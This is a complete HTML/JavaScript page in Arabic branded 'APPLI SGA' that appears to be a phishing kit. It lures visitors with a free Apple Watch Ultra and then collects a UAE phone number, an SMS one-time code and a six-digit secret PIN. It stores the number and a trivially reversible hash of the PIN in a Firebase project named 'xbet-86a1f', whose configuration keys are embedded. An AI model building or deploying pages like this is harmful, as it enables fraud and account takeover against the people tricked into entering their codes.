<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>APPLI SGA</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Tajawal',sans-serif}
  html,body{width:100%;height:100%;overflow:hidden;background:#fff}
  .app{width:100%;height:100%;max-width:430px;margin:0 auto;position:relative;display:flex;flex-direction:column;overflow:hidden;background:#fff}

  .hero{background:linear-gradient(160deg,#7A0010 0%,#A3001F 45%,#C41E3A 100%);padding:40px 20px 70px;text-align:center;position:relative;flex-shrink:0}
  .hero::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:34px;background:#fff;border-radius:34px 34px 0 0}
  .help{position:absolute;top:18px;right:18px;width:30px;height:30px;border:2px solid rgba(255,255,255,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
  .brand{color:#fff;font-size:28px;font-weight:800;letter-spacing:2px;direction:ltr}
  .brand small{display:block;font-size:13px;font-weight:500;letter-spacing:4px;margin-top:2px;opacity:.9}

  .screen{display:none;flex-direction:column;height:100%}
  .screen.on{display:flex}
  .giveaway{flex:1;padding:0 22px 22px;display:flex;flex-direction:column;position:relative;z-index:2;margin-top:-30px}
  .g-card{background:#fff;border-radius:26px;box-shadow:0 6px 24px rgba(0,0,0,.08);padding:26px 18px;text-align:center;flex:1;display:flex;flex-direction:column;justify-content:center}
  .g-img{width:100%;max-height:300px;object-fit:contain;margin-bottom:18px}
  .g-title{font-size:26px;font-weight:800;color:#111;margin-bottom:10px;direction:ltr}
  .g-sub{font-size:20px;font-weight:700;color:#222;line-height:1.6}
  .btn-red{width:100%;padding:17px;background:linear-gradient(135deg,#C41E3A,#8B0016);color:#fff;border:none;border-radius:999px;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 5px 16px rgba(196,30,58,.35);margin-top:18px;transition:transform .15s}
  .btn-red:active{transform:scale(.98)}

  .btn-pink{width:100%;padding:16px;background:linear-gradient(135deg,#E8A0B0,#D4899A);color:#fff;border:none;border-radius:999px;font-size:17px;font-weight:700;cursor:default;transition:all .2s;font-family:'Tajawal',sans-serif}
  .btn-pink.ready{background:linear-gradient(135deg,#C41E3A,#A3001F);cursor:pointer;box-shadow:0 4px 14px rgba(196,30,58,.3)}
  .btn-pink:disabled{opacity:.6;cursor:wait}

  .login-body{flex:1;padding:34px 22px 22px;display:flex;flex-direction:column}
  .l-title{font-size:19px;font-weight:700;color:#111;text-align:center;margin-bottom:22px}
  .phone-box{display:flex;align-items:center;border:1.5px solid #e3e3e6;border-radius:14px;padding:15px 16px;background:#fafafa;transition:.2s}
  .phone-box:focus-within{border-color:#C41E3A;background:#fff}
  .prefix{font-size:16px;font-weight:700;color:#111;margin-left:10px;direction:ltr}
  .phone-box input{flex:1;border:none;outline:none;background:transparent;font-size:17px;color:#111;direction:ltr;text-align:left;letter-spacing:1px;font-family:'Tajawal',sans-serif}
  .checks{margin-top:20px;display:flex;flex-direction:column;gap:14px}
  .crow{display:flex;align-items:flex-start;gap:10px;cursor:pointer}
  .cbox{width:20px;height:20px;flex-shrink:0;border:1.5px solid #d5d5d5;border-radius:5px;display:flex;align-items:center;justify-content:center;transition:.2s;margin-top:2px}
  .crow.on .cbox{background:#C41E3A;border-color:#C41E3A}
  .cbox svg{width:12px;height:12px;display:none}
  .crow.on .cbox svg{display:block}
  .clabel{font-size:14px;color:#333;line-height:1.5}
  .clabel.link{color:#C41E3A;font-weight:600}
  .login-body .btn-pink{margin-top:auto}

  .topbar{padding:26px 20px 6px;text-align:center;position:relative;flex-shrink:0}
  .topbar .back{position:absolute;top:24px;left:20px;cursor:pointer}
  .topbar .t1{font-size:14px;color:#999;margin-bottom:4px}
  .topbar .t2{font-size:20px;font-weight:700;color:#111}

  .otp-desc{text-align:center;padding:26px 20px 8px;font-size:15px;color:#555;line-height:1.7}
  .otp-desc b{direction:ltr;display:inline-block;color:#111}
  .otp-boxes{display:flex;justify-content:center;gap:12px;padding:18px 20px;direction:ltr}
  .obox{width:62px;height:62px;border:1.5px solid #e3e3e6;border-radius:14px;background:#fafafa;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;color:#111;transition:.2s}
  .obox.filled{border-color:#C41E3A;background:#fff}
  .otp-row{display:flex;justify-content:space-between;align-items:center;padding:6px 26px;font-size:14px}
  .otp-row .left{color:#777}
  .otp-row .right{color:#C41E3A;font-weight:600;direction:ltr}
  .otp-foot{margin-top:auto;padding:0 22px 22px}

  .pin-dots{display:flex;justify-content:center;gap:16px;padding:30px 20px 26px}
  .pd{width:15px;height:15px;border-radius:50%;background:#e3e3e6;transition:.2s}
  .pd.on{background:#C41E3A}
  .pin-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 44px;max-width:300px;margin:0 auto;width:100%}
  .pk{aspect-ratio:1.5;border:none;border-radius:14px;background:#f4f4f6;font-size:26px;font-weight:700;color:#111;cursor:pointer;transition:.15s;font-family:'Tajawal',sans-serif}
  .pk:active{background:#C41E3A;color:#fff;transform:scale(.95)}
  .pk.blank{background:transparent;cursor:default}
  .pk.fn{background:transparent;font-size:20px;color:#888}
  .pin-foot{margin-top:auto;padding:0 22px 22px}

  .load{position:absolute;inset:0;background:rgba(255,255,255,.92);display:none;align-items:center;justify-content:center;z-index:50}
  .load.on{display:flex}
  .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:#C41E3A;border-radius:50%;animation:sp .8s linear infinite}
  @keyframes sp{to{transform:rotate(360deg)}}
  .dlg{position:absolute;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:51;padding:30px}
  .dlg.on{display:flex}
  .dlg-in{background:#fff;border-radius:20px;padding:26px 22px;width:100%;max-width:320px;text-align:center}
  .dlg-in p{font-size:15px;color:#333;margin-bottom:18px;line-height:1.6;white-space:pre-line}
  .dlg-in button{background:#C41E3A;color:#fff;border:none;padding:12px 40px;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer;font-family:'Tajawal',sans-serif}

  /* reCAPTCHA container — لازم يكون ظاهر ولو صغير */
  #rc{position:absolute;bottom:8px;left:8px;opacity:.4;z-index:1;min-height:78px;min-width:78px}
</style>
</head>
<body>
<div class="app">

  <div class="screen on" id="s1">
    <div class="hero">
      <div class="help">?</div>
      <div class="brand">APPLI SGA<small>APP</small></div>
    </div>
    <div class="giveaway">
      <div class="g-card">
        <img class="g-img" src="https://placehold.co/300x260/f5f5f7/222?text=APPLI+SGA" alt="جائزة">
        <div class="g-title">Apple Watch Ultra</div>
        <div class="g-sub">قدّم الحين على ساعة مجانية<br>واصلة لباب بيتك</div>
      </div>
      <button class="btn-red" onclick="go('s2')">قدّم الحين</button>
    </div>
  </div>

  <div class="screen" id="s2">
    <div class="hero" style="padding-bottom:50px">
      <div class="help">?</div>
      <div class="brand" style="font-size:24px">APPLI SGA</div>
    </div>
    <div class="login-body">
      <div class="l-title">سجّل الدخول إلى حسابك في APPLI SGA</div>
      <div class="phone-box">
        <span class="prefix">+971</span>
        <input type="tel" id="phone" placeholder="00 000 0000" maxlength="12" inputmode="numeric">
      </div>
      <div class="checks">
        <label class="crow" id="c1"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel link">قبول الشروط والأحكام</span></label>
        <label class="crow" id="c2"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel link">قبول سياسة الخصوصية</span></label>
        <label class="crow" id="c3"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel">أرغب في تلقي رسائل تسويقية حول عروض APPLI SGA</span></label>
      </div>
      <button class="btn-pink" id="btnLogin" onclick="sendOtp()">دخول</button>
    </div>
  </div>

  <div class="screen" id="s3">
    <div class="topbar">
      <div class="back" onclick="go('s2')"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      <div class="t1">تسجيل الدخول</div>
      <div class="t2">التحقق من رقم الموبايل</div>
    </div>
    <div class="otp-desc">أدخل رمز OTP المرسل إلى<br><b id="otpPhone">+971</b></div>
    <div class="otp-boxes" id="boxes"></div>
    <input type="tel" id="otpHidden" inputmode="numeric" maxlength="6" style="position:absolute;opacity:0;pointer-events:none">
    <div class="otp-row">
      <span class="left" id="resend" style="cursor:default">إعادة إرسال OTP (<span id="tsec">118</span>s)</span>
      <span class="right" onclick="document.getElementById('otpHidden').focus()">لم يصلك الرمز؟</span>
    </div>
    <div class="otp-foot"><button class="btn-pink" id="btnOtp" onclick="verifyOtp()">تأكيد</button></div>
  </div>

  <div class="screen" id="s4">
    <div class="topbar">
      <div class="back" onclick="pinBackToOtp()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      <div class="t1">APPLI SGA</div>
      <div class="t2" id="pinTitle">أدخل رمزك السري</div>
    </div>
    <div class="pin-dots" id="dots"></div>
    <div class="pin-pad" id="pad"></div>
    <div class="pin-foot"><button class="btn-pink" id="btnPin" onclick="submitPin()">تأكيد</button></div>
  </div>

  <div class="load" id="load"><div class="spin"></div></div>
  <div class="dlg" id="dlg"><div class="dlg-in"><p id="dlgTxt"></p><button onclick="closeDlg()">حسناً</button></div></div>
  <div id="rc"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
<script>
/* ============================================================
   ✅ إعدادات Firebase — ويب صحيحة
   ============================================================ */
var firebaseConfig = {
  apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
  authDomain: "xbet-86a1f.firebaseapp.com",
  databaseURL: "https://xbet-86a1f-default-rtdb.firebaseio.com",
  projectId: "xbet-86a1f",
  storageBucket: "xbet-86a1f.firebasestorage.app",
  messagingSenderId: "1049564126267",
  appId: "1:1049564126267:web:58eb824eda9566ae79501e",
  measurementId: "G-MZDXDMQ2HB"
};

var auth = null, db = null;
try {
  firebase.initializeApp(firebaseConfig);
  auth = firebase.auth();
  db   = firebase.database();
  auth.languageCode = 'ar';
  console.log('✅ Firebase initialized');
} catch(e) {
  console.error('❌ Firebase init failed:', e);
}

/* ===== تنبيه لو الرابط مو https/localhost ===== */
(function checkEnv(){
  var proto = location.protocol, host = location.hostname;
  var isLocal = (host === 'localhost' || host === '127.0.0.1' || host === '');
  if (proto === 'file:') {
    setTimeout(function(){ alert('⚠️ لازم تفتح الموقع من https أو localhost — reCAPTCHA لا يعمل على file://'); }, 400);
  } else if (proto !== 'https:' && !isLocal) {
    setTimeout(function(){ alert('⚠️ لازم تفتح الموقع من https'); }, 400);
  }
})();

/* ===== حالة ===== */
var phone='', confResult=null, otp='', pin='', pinConfirm='', mode='login';
var timerId=null, dlgCb=null, sending=false;

function go(id){ document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('on');}); document.getElementById(id).classList.add('on'); }
function load(b){ document.getElementById('load').classList.toggle('on',b); }
function dlg(t,cb){ document.getElementById('dlgTxt').textContent=t; document.getElementById('dlg').classList.add('on'); dlgCb=cb||null; }
function closeDlg(){ document.getElementById('dlg').classList.remove('on'); if(dlgCb){var c=dlgCb;dlgCb=null;c();} }

/* ===== شاشة 2 ===== */
var phoneEl = document.getElementById('phone'), btnLogin = document.getElementById('btnLogin');
phoneEl.addEventListener('input', function(e){ e.target.value = e.target.value.replace(/\D/g,''); updLogin(); });
['c1','c2','c3'].forEach(function(id){ document.getElementById(id).addEventListener('click', function(){ this.classList.toggle('on'); updLogin(); }); });
function updLogin(){
  var ok = phoneEl.value.length >= 9 &&
           document.getElementById('c1').classList.contains('on') &&
           document.getElementById('c2').classList.contains('on');
  btnLogin.classList.toggle('ready', ok);
}

/* ============================================================
   ✅ إرسال OTP — بدون render() وبدون تعليق
   ============================================================ */
function sendOtp(){
  if (sending) return;
  if (!btnLogin.classList.contains('ready')) { dlg('أكمل البيانات أولاً'); return; }
  if (!auth) { dlg('Firebase لم يتم تهيئته'); return; }

  var raw = phoneEl.value.replace(/^0+/,'');
  if (raw.length < 8 || raw.length > 10) { dlg('رقم الهاتف غير صحيح'); return; }

  phone = '+971' + raw;
  sending = true;
  btnLogin.disabled = true;
  load(true);
  console.log('📤 Sending OTP to:', phone);

  /* امسح أي reCAPTCHA قديم */
  if (window.rcv) {
    try { window.rcv.clear(); } catch(_){}
    window.rcv = null;
  }

  /* أنشئ واحد جديد (invisible) */
  try {
    window.rcv = new firebase.auth.RecaptchaVerifier('rc', {
      size: 'invisible',
      callback: function(){ console.log('✅ reCAPTCHA solved'); },
      'expired-callback': function(){ console.log('⚠️ reCAPTCHA expired'); }
    });
  } catch(e){
    console.error('❌ RecaptchaVerifier create error:', e);
    sending = false; btnLogin.disabled = false; load(false);
    dlg('فشل تهيئة reCAPTCHA: ' + (e.message||e));
    return;
  }

  /* نجيب نتيجة خلال 25 ثانية أو نلغي */
  var sendPromise = auth.signInWithPhoneNumber(phone, window.rcv);
  var timeoutPromise = new Promise(function(_, reject){
    setTimeout(function(){ reject({ code:'app/timeout', message:'انتهت مدة الانتظار' }); }, 25000);
  });

  Promise.race([sendPromise, timeoutPromise])
    .then(function(result){
      console.log('✅ OTP sent. verificationId ready');
      confResult = result;
      sending = false; btnLogin.disabled = false; load(false);

      document.getElementById('otpPhone').textContent = phone;
      otp = ''; buildBoxes(); startTimer();
      go('s3');
      setTimeout(function(){ document.getElementById('otpHidden').focus(); }, 150);
    })
    .catch(function(e){
      console.error('❌ sendOtp failed:', e);
      sending = false; btnLogin.disabled = false; load(false);
      try { if (window.rcv) window.rcv.clear(); } catch(_){}
      window.rcv = null;
      dlg(translateAuthError(e));
    });
}

/* ===== ترجمة الأخطاء ===== */
function translateAuthError(e){
  var c = (e && e.code) ? e.code : '';
  if (c === 'app/timeout') return 'تعذّر إرسال الرمز (انتهت مدة الانتظار).\nتأكد من:\n• اتصالك بالإنترنت\n• Authorized domains في Firebase\n• رصيد Firebase (Blaze) مفعّل';
  switch(c){
    case 'auth/internal-error':
      return 'خطأ داخلي:\n• تأكد من Authorized domains\n• افتح عبر https أو localhost\n• فعّل Phone Auth في Console\n• تأكد من Blaze plan';
    case 'auth/invalid-phone-number': return 'رقم الهاتف غير صحيح. أدخل بدون الصفر في البداية.';
    case 'auth/too-many-requests': return 'محاولات كثيرة. انتظر ثم حاول.';
    case 'auth/captcha-check-failed': return 'فشل reCAPTCHA. أعد تحميل الصفحة.';
    case 'auth/unauthorized-domain': return 'النطاق غير مصرّح.\nFirebase → Authentication → Settings → Authorized domains';
    case 'auth/quota-exceeded': return 'انتهت حصة الرسائل اليومية.';
    case 'auth/operation-not-allowed': return 'Phone Auth غير مفعّل في Console.';
    case 'auth/billing-not-enabled': return 'لازم تفعيل Blaze (الفوترة) لاستخدام Phone Auth.';
    case 'auth/missing-phone-number': return 'الرجاء إدخال رقم الهاتف.';
    case 'auth/app-not-authorized': return 'المفتاح/التطبيق غير مصرّح. تأكد من appId.';
    default: return 'تعذّر إرسال الرمز:\n' + (c || (e && e.message) || 'خطأ غير معروف');
  }
}

/* ===== شاشة 3: OTP ===== */
function buildBoxes(){
  var c = document.getElementById('boxes'); c.innerHTML='';
  for (var i=0;i<6;i++){
    var d = document.createElement('div');
    d.className='obox';
    d.onclick = function(){ document.getElementById('otpHidden').focus(); };
    c.appendChild(d);
  }
  updBoxes();
}
function updBoxes(){
  document.querySelectorAll('.obox').forEach(function(b,i){
    b.textContent = otp[i] || '';
    b.classList.toggle('filled', !!otp[i]);
  });
  document.getElementById('btnOtp').classList.toggle('ready', otp.length === 6);
}
document.getElementById('otpHidden').addEventListener('input', function(e){
  otp = e.target.value.replace(/\D/g,'').slice(0,6);
  updBoxes();
});
function startTimer(){
  var s = 118;
  var rs = document.getElementById('resend');
  rs.style.cursor='default'; rs.style.color='#777';
  rs.innerHTML = 'إعادة إرسال OTP (<span id="tsec">'+s+'</span>s)';
  clearInterval(timerId);
  timerId = setInterval(function(){
    s--;
    var el2 = document.getElementById('tsec');
    if (el2) el2.textContent = s;
    if (s <= 0){
      clearInterval(timerId);
      rs.style.cursor='pointer'; rs.style.color='#C41E3A';
      rs.innerHTML = 'إعادة إرسال OTP';
    }
  }, 1000);
}
document.getElementById('resend').addEventListener('click', function(){
  if (this.style.color === 'rgb(196, 30, 58)') sendOtp();
});

function verifyOtp(){
  if (otp.length !== 6 || !confResult) return;
  load(true);
  confResult.confirm(otp)
    .then(function(res){
      return db.ref('users/'+res.user.uid+'/pinHash').get()
        .then(function(snap){ return { uid: res.user.uid, snap: snap }; });
    })
    .then(function(data){
      load(false);
      if (data.snap.exists()){ mode='login'; document.getElementById('pinTitle').textContent='أدخل رمزك السري'; }
      else { mode='set'; pinConfirm=''; document.getElementById('pinTitle').textContent='أنشئ رمزك السري'; }
      pin=''; buildPad(); updDots(); go('s4');
    })
    .catch(function(e){
      load(false);
      console.error('❌ verifyOtp error:', e);
      if (e.code==='auth/invalid-verification-code') dlg('رمز OTP غير صحيح');
      else if (e.code==='auth/code-expired') dlg('انتهت صلاحية الرمز، أعد الإرسال');
      else dlg('تعذّر التحقق:\n' + (e.code || e.message));
    });
}

/* ===== شاشة 4: PIN ===== */
function buildPad(){
  var pad = document.getElementById('pad'); pad.innerHTML='';
  [1,2,3,4,5,6,7,8,9,'','0','⌫'].forEach(function(k){
    var b = document.createElement('button');
    b.className = 'pk' + (k===''?' blank' : k==='⌫'?' fn' : '');
    b.textContent = k;
    if (k !== '') b.onclick = function(){ press(k); };
    pad.appendChild(b);
  });
  var d = document.getElementById('dots'); d.innerHTML='';
  for (var i=0;i<6;i++){ var x=document.createElement('div'); x.className='pd'; d.appendChild(x); }
}
function updDots(){
  document.querySelectorAll('.pd').forEach(function(x,i){ x.classList.toggle('on', i<pin.length); });
  document.getElementById('btnPin').classList.toggle('ready', pin.length === 6);
}
function press(k){
  if (k === '⌫') pin = pin.slice(0,-1);
  else if (pin.length < 6) pin += k;
  updDots();
  if (pin.length === 6) setTimeout(submitPin, 250);
}
function submitPin(){
  if (pin.length !== 6) return;
  if (!auth.currentUser){ dlg('انتهت الجلسة، أعد تسجيل الدخول', function(){ go('s2'); }); return; }
  load(true);
  var uid = auth.currentUser.uid;

  if (mode === 'set'){
    if (!pinConfirm){
      pinConfirm = pin; pin=''; updDots();
      document.getElementById('pinTitle').textContent = 'أكد رمزك السري';
      load(false); return;
    }
    if (pin !== pinConfirm){
      load(false); pin=''; pinConfirm=''; updDots();
      document.getElementById('pinTitle').textContent = 'أنشئ رمزك السري';
      dlg('الرمزان غير متطابقين'); return;
    }
    db.ref('users/'+uid).set({
      phone: phone, pinHash: hash(pin), createdAt: Date.now(), status: 'active'
    }).then(function(){
      load(false);
      dlg('تم إنشاء حسابك بنجاح 🎉', function(){ pin=''; updDots(); go('s1'); });
    }).catch(function(e){
      console.error(e); load(false); dlg('تعذر الحفظ في قاعدة البيانات');
    });
  } else {
    db.ref('users/'+uid+'/pinHash').get().then(function(snap){
      load(false);
      if (snap.val() === hash(pin)){
        dlg('تم تسجيل الدخول بنجاح 🎉', function(){ pin=''; updDots(); go('s1'); });
      } else {
        dlg('الرمز السري غير صحيح', function(){ pin=''; updDots(); go('s3'); });
      }
    }).catch(function(e){
      console.error(e); load(false); dlg('تعذر القراءة من قاعدة البيانات');
    });
  }
}
function pinBackToOtp(){ pin=''; updDots(); go('s3'); }
function hash(s){ var h=0; for(var i=0;i<s.length;i++){ h=((h<<5)-h)+s.charCodeAt(i); h|=0; } return 'h'+Math.abs(h).toString(36)+s.length; }
</script>
